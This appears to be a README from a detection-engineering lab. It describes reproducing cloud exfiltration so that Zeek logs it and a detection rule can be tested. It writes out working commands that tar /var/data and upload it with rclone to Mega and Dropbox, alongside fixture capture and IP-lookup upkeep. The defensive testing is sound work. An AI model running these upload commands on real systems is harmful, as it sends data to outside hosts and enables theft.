# Attack reproduction — rclone to Mega.nz

`rclone` from a victim host pushes a tar of `/var/data` to a Mega.nz
account. Zeek records each upload chunk; the detection in
`../detection/` aggregates and fires.

## Prereqs

- Victim host on the lab subnet with `rclone` installed
- A Mega.nz account (or any other supported cloud — rclone covers 50+)
- Lab compose stack running

## Run (high level)

```bash
# Configure rclone for Mega (or your chosen provider)
rclone config

# Stage data — modern ransomware operators tar a directory then push it
tar czf /tmp/staged.tgz /var/data
rclone copy /tmp/staged.tgz mega:exfil/

# Variations
rclone sync /var/data mega:exfil-mirror/
rclone copy /tmp/staged.tgz dropbox:incoming/
```

## Capture telemetry into a fixture

```bash
docker exec detlab-zeek cat /usr/local/zeek/logs/current/conn.log \
  | jq -c "select(.\"id.orig_h\" == \"<victim_ip>\" and .orig_bytes > 1000000)" \
  > /tmp/cloud_exfil_capture.log
head -50 /tmp/cloud_exfil_capture.log > tests/positive_conn.log
```

## Refreshing the IP lookup

The lab ships a synthetic IP set (LAB_CLOUD_STORAGE_IPS in
`src/detlab/detector.py` and `app/lookups/cloud_storage_ips.csv`). For
production, replace it with a maintained feed. Options:

- Cisco Umbrella / Talos categorisation export (paid)
- ZScaler app inventory export (paid)
- Hand-curated list from your vendor cloud-app inventory (free, manual)
- DNS-driven enrichment: resolve `mega.nz`, `dropbox.com`, `wetransfer.com`,
  etc. on a cron and write the resolved IPs into the lookup. Less precise
  (CDN drift) but free

## Safety / scope

- Lab use only.
- All listed cloud-storage providers are legitimate SaaS; running the
  client on a host you own is unambiguously defensive work.
- The synthetic `tests/positive_conn.log` shipped here is generated by
  `scripts/generate_fixtures.py` so the test suite is hermetic.
